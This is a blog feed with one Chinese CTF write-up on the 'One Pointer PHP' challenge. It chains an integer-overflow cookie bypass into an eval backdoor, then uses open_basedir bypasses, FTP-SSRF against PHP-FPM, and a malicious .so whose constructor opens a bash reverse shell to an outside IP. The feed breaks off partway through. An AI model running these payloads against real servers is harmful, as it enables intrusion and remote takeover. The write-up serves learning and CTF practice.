<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>m0nk3y&#39;s Blog @ D0g3</title>
  
  
  <link href="https://hack-for.fun/atom.xml" rel="self"/>
  
  <link href="https://hack-for.fun/"/>
  <updated>2021-05-25T10:09:45.528Z</updated>
  <id>https://hack-for.fun/</id>
  
  <author>
    <name>m0nk3y</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>[蓝帽杯 2021]One Pointer PHP复现</title>
    <link href="https://hack-for.fun/c125.html"/>
    <id>https://hack-for.fun/c125.html</id>
    <published>2021-05-24T13:51:20.000Z</published>
    <updated>2021-05-25T10:09:45.528Z</updated>
    
    <content type="html"><![CDATA[<p>很不错的一道题，值得复现一下。</p><a id="more"></a><p>复现地址：BUUCTF</p><p><a href="https://buuoj.cn/challenges#[%E8%93%9D%E5%B8%BD%E6%9D%AF%202021\]One%20Pointer%20PHP]">https://buuoj.cn/challenges#[%E8%93%9D%E5%B8%BD%E6%9D%AF%202021\]One%20Pointer%20PHP]</a>(<a href="https://buuoj.cn/challenges#[%E8%93%9D%E5%B8%BD%E6%9D%AF">https://buuoj.cn/challenges#[蓝帽杯</a> 2021]One Pointer PHP)</p><h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><p>#user.php,定义了User类，类属性count</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $count;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>#add_api.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;user.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>($user=unserialize($_COOKIE[<span class="string">&quot;data&quot;</span>]))&#123;</span><br><span class="line">$count[++$user-&gt;count]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>($count[]=<span class="number">1</span>)&#123;</span><br><span class="line">$user-&gt;count+=<span class="number">1</span>;</span><br><span class="line">setcookie(<span class="string">&quot;data&quot;</span>,serialize($user));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">eval</span>($_GET[<span class="string">&quot;backdoor&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$user=<span class="keyword">new</span> User;</span><br><span class="line">$user-&gt;count=<span class="number">1</span>;</span><br><span class="line">setcookie(<span class="string">&quot;data&quot;</span>,serialize($user));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>如果<code>if($count[]=1)</code>为false的话，就可以<code>        eval($_GET[&quot;backdoor&quot;]);</code> RCE。count通过反序列化Cookie中的data获得。</p><h1 id="知识复现和解题过程"><a href="#知识复现和解题过程" class="headerlink" title="知识复现和解题过程"></a>知识复现和解题过程</h1><h2 id="知识一-PHP-数组溢出"><a href="#知识一-PHP-数组溢出" class="headerlink" title="知识一(PHP 数组溢出)"></a>知识一(PHP 数组溢出)</h2><p>利用long 类型最大值绕过<code>$count[]=1</code>，注意这里是<code>=</code>赋值语句，也就是说无论如何返回都为<code>1</code></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210525175438.png"></p><blockquote><p>利用数组溢出报错返回0来绕过</p></blockquote><hr><blockquote><p>在 PHP 中，整型数是有一个范围的，对于32位的操作系统，最大的整型是2147483647，即2的31次方，最小为-2的31次方。如果给定的一个整数超出了整型（integer）的范围，将会被解释为浮点型（float）。同样如果执行的运算结果超出了整型（integer）范围，也会返回浮点型（float）。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210525175455.png"></p><p>再回到题目中的代码逻辑:</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210525175628.png"></p><p>这里报错的原因是因为新键为<code>PHP_INT_MAX+1</code>，返回0。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">9223372036854775806</span><br><span class="line">9223372036854775807</span><br></pre></td></tr></table></figure><p>生成cookie</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $count=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    $user=<span class="keyword">new</span> User;</span><br><span class="line">    $user-&gt;count=<span class="number">9223372036854775806</span>;</span><br><span class="line">    <span class="keyword">echo</span> serialize($user);</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;User&quot;:1:&#123;s:5:&quot;count&quot;;i:9223372036854775806;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;add_api.php?backdoor&#x3D;phpinfo(); HTTP&#x2F;1.1</span><br><span class="line">Host: 53828184-93a2-4d8a-8ee2-2954207c64cf.node3.buuoj.cn</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;84.0.4147.135 Safari&#x2F;537.36 Edg&#x2F;84.0.522.63</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8,en-GB;q&#x3D;0.7,en-US;q&#x3D;0.6</span><br><span class="line">Cookie: UM_distinctid&#x3D;1763cb89271745-00af44cd85a641-7c690e53-13c680-1763cb892722e2; data&#x3D;O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bi%3A9223372036854775806%3B%7D</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210525175707.png"></p><p>PHP高版本，7.4.16，运行着FPM/FastCGI</p><ul><li>查看df</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stream_socket_client,fsockopen,putenv,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,iconv,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,error_log,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive</span><br></pre></td></tr></table></figure><p>过滤了很多RCE的函数，但是文件相关的函数例如，file_put_contents,scandir,chdir,没过滤，如果可以，是否可以通过文件操作去读取flag呢？</p><ul><li>查看open_basedir</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210525175707.png"></p><p>限制在<code>/var/www/html</code> web 目录</p><h2 id="知识二-open-basedir-Bypass-列目录"><a href="#知识二-open-basedir-Bypass-列目录" class="headerlink" title="知识二(open_basedir Bypass 列目录)"></a>知识二(open_basedir Bypass 列目录)</h2><p><a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html">https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html</a></p><p>P神早在2014年就研究过这个问题，</p><p>Open_basedir是PHP设置中为了防御PHP跨目录进行文件（目录）读写的方法，所有PHP中有关文件读、写的函数都会经过open_basedir的检查。Open_basedir实际上是一些目录的集合，在定义了open_basedir以后，php可以读写的文件、目录都将被限制在这些目录中。</p><p>设置open_basedir的方法，在linux下，不同的目录由“:”分割，如“/var/www/:/tmp/”；在Windows下不同目录由“;”分割，如“c:/www;c:/windows/temp”。</p><p>这里可以，<strong>利用DirectoryIterator + Glob 直接列举目录</strong></p><blockquote><p>DirectoryIterator 是php5中增加的一个类，为用户提供一个简单的查看目录的接口（The DirectoryIterator class provides a simple interface for viewing the contents of filesystem directories）。</p><p>glob: 数据流包装器是从 PHP 5.3.0 起开始有效的，用来查找匹配的文件路径。</p><p>结合这两个方式，我们就可以在php5.3以后对目录进行列举。在实测中，我们得知，此方法在Linux下列举目录居然可以无视open_basedir。– 链接博客原文内容</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">printf(<span class="string">&#x27;&lt;b&gt;open_basedir : %s &lt;/b&gt;&lt;br /&gt;&#x27;</span>, ini_get(<span class="string">&#x27;open_basedir&#x27;</span>));</span><br><span class="line">$file_list = <span class="keyword">array</span>();</span><br><span class="line"><span class="comment">// normal files</span></span><br><span class="line">$it = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>($it <span class="keyword">as</span> $f) &#123;</span><br><span class="line">    $file_list[] = $f-&gt;__toString();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// special files (starting with a dot(.))</span></span><br><span class="line">$it = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///.*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>($it <span class="keyword">as</span> $f) &#123;</span><br><span class="line">    $file_list[] = $f-&gt;__toString();</span><br><span class="line">&#125;</span><br><span class="line">sort($file_list);</span><br><span class="line"><span class="keyword">foreach</span>($file_list <span class="keyword">as</span> $f)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&#123;$f&#125;&lt;br/&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?</span><br></pre></td></tr></table></figure><p>将列目录的php代码进行url编码后，get请求即可，发现根目录存在flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;add_api.php?backdoor&#x3D;%70%72%69%6e%74%66%28%27%3c%62%3e%6f%70%65%6e%5f%62%61%73%65%64%69%72%20%3a%20%25%73%20%3c%2f%62%3e%3c%62%72%20%2f%3e%27%2c%20%69%6e%69%5f%67%65%74%28%27%6f%70%65%6e%5f%62%61%73%65%64%69%72%27%29%29%3b%0a%24%66%69%6c%65%5f%6c%69%73%74%20%3d%20%61%72%72%61%79%28%29%3b%0a%2f%2f%20%6e%6f%72%6d%61%6c%20%66%69%6c%65%73%0a%24%69%74%20%3d%20%6e%65%77%20%44%69%72%65%63%74%6f%72%79%49%74%65%72%61%74%6f%72%28%22%67%6c%6f%62%3a%2f%2f%2f%2a%22%29%3b%0a%66%6f%72%65%61%63%68%28%24%69%74%20%61%73%20%24%66%29%20%7b%0a%20%20%20%20%24%66%69%6c%65%5f%6c%69%73%74%5b%5d%20%3d%20%24%66%2d%3e%5f%5f%74%6f%53%74%72%69%6e%67%28%29%3b%0a%7d%0a%2f%2f%20%73%70%65%63%69%61%6c%20%66%69%6c%65%73%20%28%73%74%61%72%74%69%6e%67%20%77%69%74%68%20%61%20%64%6f%74%28%2e%29%29%0a%24%69%74%20%3d%20%6e%65%77%20%44%69%72%65%63%74%6f%72%79%49%74%65%72%61%74%6f%72%28%22%67%6c%6f%62%3a%2f%2f%2f%2e%2a%22%29%3b%0a%66%6f%72%65%61%63%68%28%24%69%74%20%61%73%20%24%66%29%20%7b%0a%20%20%20%20%24%66%69%6c%65%5f%6c%69%73%74%5b%5d%20%3d%20%24%66%2d%3e%5f%5f%74%6f%53%74%72%69%6e%67%28%29%3b%0a%7d%0a%73%6f%72%74%28%24%66%69%6c%65%5f%6c%69%73%74%29%3b%0a%66%6f%72%65%61%63%68%28%24%66%69%6c%65%5f%6c%69%73%74%20%61%73%20%24%66%29%7b%0a%20%20%20%20%20%20%20%20%65%63%68%6f%20%22%7b%24%66%7d%3c%62%72%2f%3e%22%3b%0a%7d HTTP&#x2F;1.1</span><br><span class="line">Host: 53828184-93a2-4d8a-8ee2-2954207c64cf.node3.buuoj.cn</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;84.0.4147.135 Safari&#x2F;537.36 Edg&#x2F;84.0.522.63</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8,en-GB;q&#x3D;0.7,en-US;q&#x3D;0.6</span><br><span class="line">Cookie: UM_distinctid&#x3D;1763cb89271745-00af44cd85a641-7c690e53-13c680-1763cb892722e2; data&#x3D;O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bi%3A9223372036854775806%3B%7D</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210525180233.png"></p><hr><p>另一个方法，利用chdir()与ini_set()组合来绕过 open_basedir 列根目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir(<span class="string">&#x27;css&#x27;</span>);chdir(<span class="string">&#x27;css&#x27;</span>);ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);print_r(scandir(<span class="string">&#x27;/&#x27;</span>));</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210525175722.png"></p><p>尝试file_get_contents来读取根目录flag，返回空白，读web目录下的文件，可以正常读取，因此这里是存在限制的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$homepage = file_get_contents(<span class="string">&#x27;/var/www/html/add_api.php&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> $homepage;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210525175732.png"></p><p>继续读取配置文件，fuzz：</p><p><a href="https://github.com/ev0A/ArbitraryFileReadList/blob/master/php_file.txt">https://github.com/ev0A/ArbitraryFileReadList/blob/master/php_file.txt</a></p><p>在phpinfo中得到php.ini的路径，<code>/usr/local/etc/php/php.ini</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;add_api.php?backdoor&#x3D;%6d%6b%64%69%72%28%27%63%73%73%27%29%3b%63%68%64%69%72%28%27%63%73%73%27%29%3b%69%6e%69%5f%73%65%74%28%27%6f%70%65%6e%5f%62%61%73%65%64%69%72%27%2c%27%2e%2e%27%29%3b%63%68%64%69%72%28%27%2e%2e%27%29%3b%63%68%64%69%72%28%27%2e%2e%27%29%3b%63%68%64%69%72%28%27%2e%2e%27%29%3b%63%68%64%69%72%28%27%2e%2e%27%29%3b%69%6e%69%5f%73%65%74%28%27%6f%70%65%6e%5f%62%61%73%65%64%69%72%27%2c%27%2f%27%29%3b%65%63%68%6f%20%66%69%6c%65%5f%67%65%74%5f%63%6f%6e%74%65%6e%74%73%28%27%2f%75%73%72%2f%6c%6f%63%61%6c%2f%65%74%63%2f%70%68%70%2f%70%68%70%2e%69%6e%69%27%29%3b HTTP&#x2F;1.1</span><br><span class="line">Host: b43d4871-9e7c-45d4-bf09-8c9c1137504a.node3.buuoj.cn</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;84.0.4147.135 Safari&#x2F;537.36 Edg&#x2F;84.0.522.63</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8,en-GB;q&#x3D;0.7,en-US;q&#x3D;0.6</span><br><span class="line">Cookie: UM_distinctid&#x3D;1763cb89271745-00af44cd85a641-7c690e53-13c680-1763cb892722e2; data&#x3D;O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bi%3A9223372036854775806%3B%7D</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210525175741.png"></p><p>发现存在easy_bypass.so这个扩展，应该是要Web-Pwn了。不会pwn，看师傅们的wp，存在其他思路。下面来继续学习。</p><h2 id="知识三-FastCGI未授权打FPM-RCE-Bypass-open-basedir"><a href="#知识三-FastCGI未授权打FPM-RCE-Bypass-open-basedir" class="headerlink" title="知识三(FastCGI未授权打FPM RCE Bypass open_basedir)"></a>知识三(FastCGI未授权打FPM RCE Bypass open_basedir)</h2><p>从最开始phpinfo中，我们知道运行着有fastcgi，当然我们也可以读取当前运行的进程来判断。</p><p>读取 /proc/self/cmdline ，当前进程是<code>php-fpm: pool www</code></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210525175754.png"></p><p>读取/etc/nginx/nginx.conf:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">##</span><br><span class="line"># Virtual Host Configs</span><br><span class="line">##</span><br><span class="line"></span><br><span class="line">include &#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;*.conf;</span><br><span class="line">include &#x2F;etc&#x2F;nginx&#x2F;sites-enabled&#x2F;*;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>列一下目录，sites-enabled只有一个default</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210525175808.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210525175817.png"></p><p>发现在本地9001端口开有FastCGI服务，phpinfo中也表明该项目为FPM/FastCGI，可以通过未授权打FPM rce</p><p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p><blockquote><p>FPM其实是一个fastcgi协议解析器，Nginx等服务器中间件将用户请求按照fastcgi的规则打包好通过TCP传给谁？其实就是传给FPM。</p><p>FPM按照fastcgi的协议将TCP流解析成真正的数据。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">举个例子，用户访问http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php?a&#x3D;1&amp;b&#x3D;2，如果web目录是&#x2F;var&#x2F;www&#x2F;html，那么Nginx会将这个请求变成如下key-value对：</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &#39;GATEWAY_INTERFACE&#39;: &#39;FastCGI&#x2F;1.0&#39;,</span><br><span class="line">    &#39;REQUEST_METHOD&#39;: &#39;GET&#39;,</span><br><span class="line">    &#39;SCRIPT_FILENAME&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;,</span><br><span class="line">    &#39;SCRIPT_NAME&#39;: &#39;&#x2F;index.php&#39;,</span><br><span class="line">    &#39;QUERY_STRING&#39;: &#39;?a&#x3D;1&amp;b&#x3D;2&#39;,</span><br><span class="line">    &#39;REQUEST_URI&#39;: &#39;&#x2F;index.php?a&#x3D;1&amp;b&#x3D;2&#39;,</span><br><span class="line">    &#39;DOCUMENT_ROOT&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#39;,</span><br><span class="line">    &#39;SERVER_SOFTWARE&#39;: &#39;php&#x2F;fcgiclient&#39;,</span><br><span class="line">    &#39;REMOTE_ADDR&#39;: &#39;127.0.0.1&#39;,</span><br><span class="line">    &#39;REMOTE_PORT&#39;: &#39;12345&#39;,</span><br><span class="line">    &#39;SERVER_ADDR&#39;: &#39;127.0.0.1&#39;,</span><br><span class="line">    &#39;SERVER_PORT&#39;: &#39;80&#39;,</span><br><span class="line">    &#39;SERVER_NAME&#39;: &quot;localhost&quot;,</span><br><span class="line">    &#39;SERVER_PROTOCOL&#39;: &#39;HTTP&#x2F;1.1&#39;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>通过在FastCGI协议修改PHP_VALUE字段进而修改php.ini中的一些设置，而open_basedir 同样可以通过此种方法进行设置。比如：<code>$php_value = &quot;open_basedir = /&quot;;</code></li><li>因为FPM没有判断请求的来源是否必须来自Webserver。根据PHP解析器的流程，我们可以伪造FastCGI向FPM发起请求，PHP_VALUE相当于改变.ini中的设置，覆盖了本身的open_basedir</li></ul><p>通过 eval() 执行任意代码，构造恶意代码进行 SSRF，利用 SSRF 攻击本地的 PHP-FPM。</p><p>disable_class</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Exception,SplDoublyLinkedList,Error,ErrorException,ArgumentCountError,ArithmeticError,AssertionError,DivisionByZeroError,CompileError,ParseError,TypeError,ValueError,UnhandledMatchError,ClosedGeneratorException,LogicException,BadFunctionCallException,BadMethodCallException,DomainException,InvalidArgumentException,LengthException,OutOfRangeException,PharException,ReflectionException,RuntimeException,OutOfBoundsException,OverflowException,PDOException,RangeException,UnderflowException,UnexpectedValueException,JsonException,SodiumException&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Exception,SplDoublyLinkedList,Error,ErrorException,ArgumentCountError,ArithmeticError,AssertionError,DivisionByZeroError,CompileError,ParseError,TypeError,ValueError,UnhandledMatchError,ClosedGeneratorException,LogicException,BadFunctionCallException,BadMethodCallException,DomainException,InvalidArgumentException,LengthException,OutOfRangeException,PharException,ReflectionException,RuntimeException,OutOfBoundsException,OverflowException,PDOException,RangeException,UnderflowException,UnexpectedValueException,JsonException,SodiumException</span><br></pre></td></tr></table></figure><p>php 支持的协议和封装：<a href="https://www.php.net/manual/zh/wrappers.php#wrappers%EF%BC%8C%E5%8F%AF%E4%BB%A3%E6%9B%BF%E5%8F%91%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8C%85%E7%9A%84%E5%8D%8F%E8%AE%AE%E5%8F%AA%E6%9C%89%60ftp://%60">https://www.php.net/manual/zh/wrappers.php#wrappers，可代替发二进制包的协议只有`ftp://`</a></p><blockquote><p><strong>ftp 的两种传输模式</strong></p><p>ftp 有两种使用模式：主动模式（port）和被动模式（pasv）。</p><p>port 要求客户端和服务器端同时打开并且监听一个端口以创建连接。在这种情况下，客户端由于安装了防火墙会产生一些问题，连接有时候会被客户端的防火墙阻止。所以，创立了 pasv 。pasv 只要求服务器端产生一个监听相应端口的进程，这样就可以绕过客户端安装了防火墙的问题。</p><p>ftp 客户端和服务器之间需要建立两条 tcp 连接，一条是控制连接（ 21 端口），用来发送控制指令，另外一条是数据连接（ 20 端口 / 随机端口），真正的文件传输是通过数据连接来完成的。</p><p><strong>两种传输模式的异同</strong></p><p>对于两种传输模式来说，控制连接的建立过程都是一样，均为服务器监听 21 号端口，客户端向服务器的该端口发起 tcp 连接。</p><p>两种传输模式的不同之处体现在数据连接的建立，对于数据连接的建立，主被动模式的不同在于数据连接的建立“服务器”是“主动”还是”被动”：</p><p>port 服务器通过控制连接知道客户端监听的端口后，使用自己的 20 号端口作为源端口，服务器“主动”发起 tcp 数据连接。</p><p>pasv 服务器监听 1024-65535 的一个随机端口，并通过控制连接将该端口告诉客户端，客户端向服务器的该端口发起 tcp 数据连接，这种情况下数据连接的建立相当于服务器是“被动”的。</p></blockquote><p>因此这里用ftp-ssrf来进行利用，ftp被动传输，使高端口为本地php-fpm服务监听的的9000端口</p><h2 id="知识四-恶意-so文件加载-amp-amp-payload生成-amp-amp-恶意ftp服务"><a href="#知识四-恶意-so文件加载-amp-amp-payload生成-amp-amp-恶意ftp服务" class="headerlink" title="知识四(恶意.so文件加载 &amp;&amp; payload生成 &amp;&amp; 恶意ftp服务)"></a>知识四(恶意.so文件加载 &amp;&amp; payload生成 &amp;&amp; 恶意ftp服务)</h2><ul><li>编写so文件</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/45.76.110.116/2333 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在Linux下的gcc编译</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc ctf.c -fPIC -shared -o ctf.so</span><br></pre></td></tr></table></figure><p>上传ctf.so 到/tmp目录,使用<code>copy</code>函数，</p><p><a 